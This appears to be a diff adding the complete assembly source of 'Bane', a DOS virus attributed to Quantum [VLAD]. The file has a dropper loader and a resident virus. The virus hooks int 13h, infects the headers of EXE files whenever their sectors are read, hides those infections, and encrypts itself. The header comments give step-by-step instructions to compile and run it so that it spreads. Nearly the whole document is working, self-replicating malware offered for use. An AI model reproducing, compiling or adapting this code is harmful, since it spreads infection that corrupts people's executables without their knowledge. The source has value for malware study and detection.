@@ -1,0 +1,308 @@
+;
+; "Bane" - by Quantum [VLAD]
+;
+; Summary: This is an Exe Header virus that has
+;          int 13 infection and full stealth
+;          oh.. and just a little encryption :)
+;
+; Details: The virus code is a mere 256 bytes so it is optimised to shit,
+;  and squeezed into the exe header at offset 100h .. the cs:ip is then
+;  pointed to this code and the header length shortened by 100h bytes..
+;  once we have execution the resident code is shoved in above the int
+;  table at 20:0 and int 13 pointed to it.. after restoring all the reg's
+;  we jump to ALMOST the original cs:ip.. (cs+10h:ip) where the host goes
+;  on its way none the wiser.. as for the resident routine.. you may be
+;  thinking all those pushes and pops are unnecessary.. you're wrong..
+;  we check for a sector read.. if found we look to see if it's an exe and
+;  if it's infected (tag: 10000000 in offset 12h) if not we infect it.. if
+;  so we full stealth it .. after infecting it we re-write the sector (see
+;  notes below) and then full stealth the sector we just infected!
+;
+; Testing/Compiling: This is a dropper written in A86.. make yourself
+;  a little test executable called funnily enough "Test.exe" then compile
+;  and run this source.. The test exe is now infected.. run it and any
+;  read on a exe (including execute/streams/FCB's/etc) will infect that
+;  exe.. but you won't know about it.. 'cause the "clean" sector will be
+;  passed back to the reader.. The virus installation code will never
+;  be run twice.. therefore there is no need for a residency checker..
+;
+; Known/Possible Bugs: Does not check to see if the exe header is standard
+;  and thus will overwrite the bottom half of pklited exe headers..
+;  also smart drive (bah!) has a habit of caching it's write to sectors and
+;  not acknowledging them.. thus the full stealth still works when smartdrv
+;  is running but no more files will be infected.. to make matters worse..
+;  even if you turn off write caching smartdrv still screws around with the
+;  writes.. them's the breaks..
+;
+; Dedication: This virus is dedicated to a loser I used to know.. this guy
+;  was so lame he faked a robbery on his own house as an insurance scam and
+;  stashed his puter at a mates place.  When it went sour and the insurance
+;  wouldnt pay him (like usual) he accused his friend of stealing his
+;  computer and ran to the cops.. a few months later they all went to court
+;  and my friend proved his innocence and the loser got charged with fraud
+;  and the judge awarded my friend the computer as compensation.
+
+; -------------- This is the Loader (Just Ignore it) -----------------------
+
+mov ax,virend-virstart ; I use this to keep my code under 100h bytes
+
+push cs
+push cs
+pop ds
+pop es
+
+mov ax,03d02h
+mov dx,offset fname
+int 21h
+
+xchg bx,ax
+
+mov ah,3fh
+mov si,offset buffer
+mov dx,si
+mov cx,200h
+int 21h
+
+push si
+add si,14h
+mov di,offset nip
+movsw
+movsw
+add word [di-2],10h
+pop si
+
+sub word [si+8h],10h
+
+mov word [si+12h],10h
+
+push si
+mov di,si
+add di,14h
+xor ax,ax
+stosw
+stosw
+add di,100h - 18h
+mov si,offset virstart
+mov cx,virend-virstart
+rep movsb
+pop si
+
+mov ax,04200h
+xor cx,cx
+cwd
+int 21h
+
+mov ah,40h
+mov cx,200h
+mov dx,si
+int 21h
+
+mov ah,3eh
+int 21h
+
+int 20h
+
+; --------------- Virus starts here (Pay Attention) ------------------------
+
+virstart:
+
+        push ax
+
+        push cs
+        push cs
+        pop ds
+        pop es
+        mov di,encstart-virstart
+        call encdecrypt
+        jmp encstart
+encbyte: db 0
+
+encdecrypt:
+        mov ah,[encbyte-virstart]
+        mov si,encstart-virstart
+        mov cx,100h-(encstart-virstart)
+encloop:
+        lodsb
+        xor al,ah
+        stosb
+        loop encloop
+        ret
+
+nip     dw 0000h    ; new ip
+ncs     dw 0000h    ; new cs
+
+encstart:
+
+        in al,40h
+        mov [encbyte-virstart],al
+
+        mov ds,cx
+
+        mov si,013h * 4
+        push si
+        mov di,offset old13i - virstart
+        movsw
+        movsw
+
+        push ds
+        pop es
+
+        pop di
+        mov ax,offset newint13 - virstart
+        stosw
+        mov ax,020h
+        stosw
+
+        push cs
+        pop ds
+
+        xor si,si
+        mov di,200h
+        mov cx,0100h
+        rep movsb
+
+        push cs
+        pop ax
+
+        add [offset ncs - virstart],ax
+
+        mov ah,0dh
+        int 21h
+
+        pop ax
+
+        xor dx,dx
+
+        jmp dword ptr cs:[nip-virstart]
+
+        db "[Bane]"
+
+newint13:
+
+        cmp ah,2
+        jz infect
+
+        db 0eah
+old13i  dw 0
+old13s  dw 0
+
+infect:
+
+        push si
+        push di
+        push ds
+        push cx
+        push es
+        push bx
+        push ax
+
+        pushf
+        call dword ptr cs:[offset old13i-virstart]
+        mov cs:[orgax-virstart],ax
+        jc nogood
+        jmp tisok
+nogood2me: clc
+nogood:
+        pop ax
+        pop bx
+        pop es
+        pop cx
+        pop ds
+        pop di
+        pop si
+        mov ax,cs:[orgax-virstart]
+        retf 2
+tisok:
+
+        cld
+
+        push es
+        pop ds
+
+        cmp word ptr [bx],"ZM"
+        jnz nogood2me
+        mov ax,10h
+        cmp word ptr [bx+12h],ax
+        jz dostealth
+
+        mov word ptr [bx+12h],ax
+
+        push cs
+        pop es
+
+        lea si,[bx + 14h]
+        push si
+        mov di,offset nip - virstart
+        add word ptr [si+2],ax
+        movsw
+        movsw
+
+        sub word ptr [bx+8h],ax
+
+        push ds
+        pop es
+        pop di
+
+        xor ax,ax
+        stosw
+        stosw
+
+        push cs
+        pop ds
+
+        xor si,si
+        lea di,[bx+100h]
+        mov cx,encstart-virstart
+        rep movsb
+
+        call encdecrypt
+
+        pop ax
+        pop bx
+        pop es
+        pop cx
+        push cx
+        push es
+        push bx
+        push ax
+
+        mov ah,3
+        pushf
+        call dword ptr [offset old13i - virstart]
+
+        push es
+        pop ds
+
+dostealth:
+
+        push ds
+        pop es
+
+        lea si,[bx+ (offset nip - virstart)+100h]
+        lea di,[bx+14h]
+        mov ax,10h
+        sub word ptr [si+2],ax
+        movsw
+        movsw
+
+        add word ptr [bx+8h],ax
+
+        xor ax,ax
+        mov si,100h
+        lea di,[bx+si]
+        xchg cx,si
+        rep stosb
+
+        jmp nogood2me
+
+orgax:
+
+virend:
+
+; ------------------------ End of Virus ------------------------------------
+
+fname db "test.exe",0
+buffer:
+
+; ------------------------ End of Loader -----------------------------------
+
